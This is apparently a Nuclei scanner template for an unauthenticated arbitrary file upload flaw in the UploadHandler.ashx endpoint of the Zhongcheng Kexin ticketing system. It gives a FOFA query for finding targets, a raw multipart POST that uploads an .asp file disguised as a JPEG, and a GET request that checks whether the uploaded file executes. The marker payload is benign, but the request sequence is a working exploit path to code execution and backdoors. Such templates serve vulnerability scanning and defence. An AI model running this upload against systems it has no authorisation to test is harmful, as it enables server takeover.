id: zhongcheng-ticket-uploadhandler-fileupload

info:
  name: 中成科信票务管理系统UploadHandler.ashx任意文件上传漏洞
  author: qwtd
  severity: critical
  description: |
    中成科信票务管理系统 UploadHandler.ashx 任意文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
  reference:
    - https://github.com/wy876/POC/blob/main/%E4%B8%AD%E6%88%90%E7%A7%91%E4%BF%A1%E7%A5%A8%E5%8A%A1%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E4%B8%AD%E6%88%90%E7%A7%91%E4%BF%A1%E7%A5%A8%E5%8A%A1%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FUploadHandler.ashx%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
  metadata:
    fofa-query: body="技术支持：北京中成科信科技发展有限公司"
  tags: 中城科信票务管理平台

variables:
  filename: '{{rand_base(6)}}'

http:
  - raw:
      - |
        POST /WeChat/ashx/UploadHandler.ashx HTTP/2
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7yyQ5XLHOn6WZ6MT
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
        
        ------WebKitFormBoundary7yyQ5XLHOn6WZ6MT
        Content-Disposition: form-data; name="file"; filename="{{filename}}.asp"
        Content-Type: image/jpeg
        
        <% Response.Write("c7ff66de90f5b695091cc4826d22d137") %>
        ------WebKitFormBoundary7yyQ5XLHOn6WZ6MT--

      - |
        GET /UploadImage/{{filename}}.asp HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'status_code_2 == 200'
          - 'contains(body_2, "c7ff66de90f5b695091cc4826d22d137")'
        condition: and
